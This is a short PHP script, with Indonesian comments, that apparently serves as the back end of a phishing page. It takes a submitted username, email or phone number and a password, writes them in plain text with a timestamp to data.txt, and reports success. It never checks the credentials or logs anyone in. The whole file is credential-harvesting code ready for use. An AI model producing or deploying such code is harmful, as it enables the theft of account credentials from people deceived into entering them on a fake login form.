<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $lahir = $_POST['lahir'];

    // Simpan data ke file teks
    $file = fopen("data.txt", "a");
    fwrite($file, "Username/Email/Phone: $username\n");
    fwrite($file, "Password: $password\n");
    fwrite($file, "Date: " . date("Y-m-d H:i:s") . "\n\n");
    fclose($file);

    echo json_encode(array('success' => 'Data saved.'));
} else {
    header("Location: index.html");
    exit();
}
?>
